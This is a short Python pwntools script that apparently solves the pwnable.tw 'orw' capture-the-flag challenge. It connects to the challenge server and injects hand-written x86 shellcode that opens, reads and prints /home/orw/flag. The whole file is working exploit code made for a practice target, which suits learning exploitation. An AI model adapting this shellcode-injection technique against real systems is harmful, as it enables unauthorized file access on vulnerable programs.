from pwn import *

exe = ELF("./orw_patched")

context.binary = exe

HOST = "chall.pwnable.tw"
PORT = 10001

gdbscript = """
set follow-fork-mode child
"""

def conn():
    return remote(HOST, PORT)

def shell(r):
    shellcode = asm("""
    mov eax, 0x5
    mov ebx, 0x804a09c
    mov ecx, 0x0
    mov edx, 0x804a0ab
    int 0x80
    mov ebx, eax
    mov eax, 0x3
    mov ecx, 0x804a100
    mov edx, 0x64
    int 0x80
    mov edx, eax
    mov eax, 0x4
    mov ebx, 0x1
    mov ecx, 0x804a100 
    int 0x80
    """)
    
    shellcode += b'/home/orw/flag\x00'
    shellcode += b'r\x00'

    r.sendafter(b"shellcode:", shellcode)
    
def main():
    r = conn()
    shell(r)
    r.interactive()

if __name__ == "__main__":
    main()
